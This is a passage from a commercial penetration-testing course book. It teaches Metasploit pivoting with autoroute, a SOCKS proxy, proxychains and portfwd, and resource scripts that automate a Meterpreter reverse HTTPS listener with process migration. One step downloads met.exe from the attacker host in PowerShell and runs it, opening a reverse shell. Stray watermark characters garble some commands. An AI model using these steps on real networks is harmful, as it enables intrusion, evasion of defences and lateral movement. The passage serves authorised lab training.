Module options (post/multi/manage/autoroute):
Name Current Setting Required Description
---- --------------- -------- -----------
CMD autoadd yes Specify the autoroute command (Accepted: add,
autoadd, print, delete, default)
NETMASK 255.255.255.0 no Netmask (IPv4 as "255.255.255.0" or CIDR as
"/24"
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 680
Made in Morocco
Penetration Testing with Kali Linux
SESSION yes The session to run this module on
SUBNET no Subnet (IPv4, for example, 10.10.10.0)
msf6 post(multi/manage/autoroute) > sessions -l
Active sessions
===============
Id Name Type Information Connection
-- ---- ---- ----------- ----------
12 meterpreter x64/windows ITWK01\luiza @ ITWK01 192.168.119.4:443 ->
127.0.0.1 ()
msf6 post(multi/manage/autoroute) > set session 12
session => 12 y
msf6 post(multi/manage/autoroute) > run
k
[!] SESSION may not be compatible with this module:
[!] * incompatible session platform: windows
s
[*] Running module against ITWK01
[*] Searching for subnets to autoroute.
[+] Route added to subnet 172.16.5.0/255.255.o255.0 from host's routing table.
[+] Route added to subnet 192.168.50.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
Listing 696 - Innvoking the autoroute module
Listing 696 shows that autoroute added 172.16.5.0/24 to the routing table.
i
We could now use the psexec module as we did before, but we can also combine routes with the
z
server/socks_proxy auxiliary module to configure a SOCKS1002 proxy. This allows applications
outside of the Metasploit Framework to tunnel through the pivot on port 1080 by default. We set
D
the option SRVHOST to 127.0.0.1 and VERSION to 5 in order to use SOCKS version 5.
msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > show options
Module options (auxiliary/server/socks_proxy):
Name Current Setting Required Description
---- --------------- -------- -----------
PASSWORD no Proxy password for SOCKS5 listener
SRVHOST 0.0.0.0 yes The local host or network interface to listen
on. This must be an address on the local machine or 0.0.0.0 to listen on all
addresses.
SRVPORT 1080 yes The port to listen on
USERNAME no Proxy username for SOCKS5 listener
VERSION 5 yes The SOCKS version to use (Accepted: 4a, 5)
Auxiliary action:
1002 (Wikipedia, 2022), https://en.wikipedia.org/wiki/SOCKS
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 681
Made in Morocco
Penetration Testing with Kali Linux
Name Description
---- -----------
Proxy Run a SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set VERSION 5
VERSION => 5
msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job 0.
[*] Starting the SOCKS proxy server
Listing 697 - Setting up a SOCKS5 proxy using the autoroute module
We can now update our proxychains configuration file (/etc/proxychains4.conf) to take advantage
y
of the SOCKS5 proxy.
After editing the configuration file, it should appear as follows: k
kali@kali:~$ tail /etc/proxychains4.conf
s
# proxy types: http, socks4, socks5, raw
# * raw: The traffic is simply forwarded to the proxy without modification.
# ( auth types supported: "basic"-httpo "user/pass"-socks )
#
[ProxyList]
# add proxy here ... n
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 1080 i
Listinzg 698 - Updated proxychains configuration
Finally, we can use proxychains to run xfreerdp to obtain GUI access from our Kali Linux system
D
to the target machine on the internal network.
kali@kali:~$ sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.5.200:3389 ... OK
...
Certificate details for 172.16.5.200:3389 (RDP-Server):
Common Name: itwk02
Subject: CN = itwk02
Issuer: CN = itwk02
Thumbprint:
4b:ef:ec:bb:96:7d:03:01:53:f3:03:de:8b:39:51:a9:bb:3f:1b:b2:70:83:08:fc:a7:9a:ec:bb:e7
:ed:98:36
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
Password:
...
Listing 699 - Gaining remote desktop access inside the internal network
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 682
Made in Morocco
Penetration Testing with Kali Linux
The xfreerdp client opens a new window providing us access to the GUI of ITWK02 in the internal
network via RDP.
y
k
s
o
n
i
z
D
Figure 266: Remote desktop access from Kali Linux to internal network
Nice! Figure 266 shows that we successfully connected to the second target via RDP by pivoting.
We can also use a similar technique for port forwarding using the portfwd command from inside
a Meterpreter session, which will forward a specific port to the internal network.
msf6 auxiliary(server/socks_proxy) > sessions -i 12
[*] Starting interaction with 5...
meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]
OPTIONS:
-h Help banner.
-i Index of the port forward entry to interact with (see the "list" command).
-l Forward: local port to listen on. Reverse: local port to connect to.
-L Forward: local host to listen on (optional). Reverse: local host to connect
to.
-p Forward: remote port to connect to. Reverse: remote port to listen on.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 683
Made in Morocco
Penetration Testing with Kali Linux
-r Forward: remote host to connect to.
-R Indicates a reverse port forward.
Listing 700 - Options available for portfwd command
We can create a port forward from localhost port 3389 to port 3389 on the target host
(172.16.5.200) as shown in Listing 701.
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.5.200
[*] Local TCP relay created: :3389  172.16.5.200:3389
Listing 701 - Forward port forwarding on port 3389
Let’s test this by connecting to 127.0.0.1:3389 with xfreerdp to access the compromised host in
the internal network.
kali@kali:~$ sudo xfreerdp /v:127.0.0.1 /u:luiza
[08:09:25:307] [1314360:1314361] [WARN][com.freerdp.crypto] -y Certificate verification
failure 'self-signed certificate (18)' at stack position 0
[08:09:25:307] [1314360:1314361] [WARN][com.freerdp.crypto] - CN = itwk02
k
...
Listing 702 - Gaining remote desktop access using port forwarding
s
Using this technique, we are able to gain a remote desktop session on a host we were otherwise
not able to reach from our Kali system. Likewise, if the second target machine was connected to
an additional network, we could create a chain of poivots to reach further hosts.
In this section, we explored various methods and modules to pivot within Metasploit. We learned
n
how to manually and automatically set routes through existing sessions and interact with
systems reachable by these routes. Then, we leveraged the socks_proxy module to create a
SOCKS proxy to reach the second target machine with proxychains. Finally, we used the
i
Meterpreter command portfwd to forward ports.
z
20.4 Automating Metasploit
D
This Learning Unit covers the following Learning Objectives:
• Create resource scripts
• Use resource scripts in Metasploit
Metasploit automates various tasks and operations for us, but we can create scripts to further
automate repetitive commands inside the framework itself. These scripts are called Resource
Scripts.1003 In this Learning Unit, we’ll explore how to create and use them.
20.4.1 Resource Scripts
Resource scripts can chain together a series of Metasploit console commands and Ruby code.
Meaning, we can either use the built-in commands of Metasploit or write code in Ruby1004 (as it’s
the language Metasploit is developed in) to manage control flow as well as develop advanced
logic components for resource scripts.
1003 (Rapid7 Documentation, 2022), https://docs.rapid7.com/metasploit/resource-scripts/
1004 (Ruby, 2022), https://www.ruby-lang.org/en/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 684
Made in Morocco
Penetration Testing with Kali Linux
In a penetration test, we may need to set up several multi/handler listeners each time we want to
receive an incoming reverse shell. We could either let Metasploit run in the background the whole
time or start Metasploit and manually set up a listener each time. We could also create a resource
script to automate this task for us.
Let’s create a resource script that starts a multi/handler listener for a non-staged Windows 64-bit
Meterpreter payload. To do this, we can create a file in the home directory of the user kali named
listener.rc and open it in an editor such as Mousepad.1005
We first need to think about the sequence of the commands we want to execute. For this
example, the first command is to activate the multi/handler module. Then, we set the payload,
which in our case, is windows/meterpreter_reverse_https. Next, we can set the LHOST and LPORT
options to fit our needs.
use exploit/multi/handler y
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443 k
Listing 703 - Activate module, set payload, and options
s
In addition, we can configure the AutoRunScript option to automatically execute a module after a
session was created. For this example, let’s use the post/windows/manage/migrate module. This
will cause the spawned Meterpreter to automaticoally launch a background notepad.exe process
and migrate to it. Automating process migration helps to avoid situations where our payload is
killed prematurely either by defensive mechanisms or the termination of the related process.
n
set AutoRunScript post/windows/manage/migrate
Listing 704 - Set AutoRunScript to the migrate module
i
z
Let’s also set ExitOnSession to false to ensure that the listener keeps accepting new connections
after a session is created.
D
set ExitOnSession false
Listing 705 - Set ExitOnSession to false to keep the multi/handler listening after a connection
We can also configure advanced options such as ExitOnSession in multi/handler
and AutoRunScript in payloads by using show advanced within the activated
module or selected payload.
Finally, we’ll add run with the arguments -z and -j to run it as a job in the background and to stop
us from automatically interacting with the session.
run -z -j
Listing 706 - Command to launch the module
Now, let’s save the script and start Metasploit by entering msfconsole with the resource script as
argument for -r.
1005 (Ubuntu Manpages, 2019), https://manpages.ubuntu.com/manpages/xenial/en/man1/mousepad.1.html
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 685
Made in Morocco
Penetration Testing with Kali Linux
kali@kali:~$ sudo msfconsole -r listener.rc
[sudo] password for kali:
...
[*] Processing listener.rc for ERB directives.
resource (listener.rc)> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (listener.rc)> set PAYLOAD windows/meterpreter/reverse_https
PAYLOAD => windows/meterpreter/reverse_https
resource (listener.rc)> set LHOST 192.168.119.4
LHOST => 192.168.119.4
resource (listener.rc)> set LPORT 443
LPORT => 443
resource (listener.rc)> set AutoRunScript post/windows/manage/migrate
AutoRunScript => post/windows/manage/migrate
resource (listener.rc)> set ExitOnSession false y
ExitOnSession => false
resource (listener.rc)> run -z -j
k
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) >
s
[*] Started HTTPS reverse handler on https://192.168.119.4:443
Listing 707 - Executing the resource script
o
Listing 707 shows that all of our commands were executed as specified in the script.
Let’s connect to the BRUTE2 machine via RnDP with user justin and password SuperS3cure1337#,
start PowerShell, download the malicious Windows executable met.exe that we already used in
previous sections, and execute it.
i
PS C:\Users\justin> iwr -uri hzttp://192.168.119.4/met.exe -Outfile met.exe
PS C:\Users\justin> .\met.exe
D
Listing 708 - Executing the Windows executable containing the Meterpreter payload
Once met.exe gets executed, Metasploit notifies us about the incoming connection.
[*] Started HTTPS reverse handler on https://192.168.119.4:443
[*] https://192.168.119.4:443 handling request from 192.168.50.202; (UUID: rdhcxgcu)
Redirecting stageless connection from
/dkFg_HAPAAB9KHwqH8FRrAG1_y2iZHe4AJlyWjYMllNXBbFbYBVD2rlxUUDdTrFO7T2gg6ma5cI-
GahhqTK9hwtqZvo9KJupBG7GYBlYyda_rDHTZ1aNMzcUn1x with UA 'Mozilla/5.0 (Windows NT 10.0;
Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0'
[*] https://192.168.119.4:443 handling request from 192.168.50.202; (UUID: rdhcxgcu)
Attaching orphaned/stageless session...
[*] Session ID 1 (192.168.119.4:443 -> 127.0.0.1) processing AutoRunScript
'post/windows/manage/migrate'
[*] Running module against BRUTE2
[*] Current server process: met.exe (2004)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 5340
[+] Successfully migrated into process 5340
[*] Meterpreter session 1 opened (192.168.119.4:443 -> 127.0.0.1) at 2022-08-02
09:54:32 -0400
Listing 709 - Incoming connection and successful migration to a newly spawned Notepad process
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 686
Made in Morocco
Penetration Testing with Kali Linux
Nice! Metasploit automatically migrated to the newly spawned Notepad process.
Instead of creating our own resource scripts, we can also use the already provided resource
scripts from Metasploit. They can be found in the scripts/resource/ directory in the Metasploit
directory.
kali@kali:~$ ls -l /usr/share/metasploit-framework/scripts/resource
total 148
-rw-r--r-- 1 root root 7270 Jul 14 12:06 auto_brute.rc
-rw-r--r-- 1 root root 2203 Jul 14 12:06 autocrawler.rc
-rw-r--r-- 1 root root 11225 Jul 14 12:06 auto_cred_checker.rc
-rw-r--r-- 1 root root 6565 Jul 14 12:06 autoexploit.rc
-rw-r--r-- 1 root root 3422 Jul 14 12:06 auto_pass_the_hash.rc
-rw-r--r-- 1 root root 876 Jul 14 12:06 auto_win32_multihandler.rc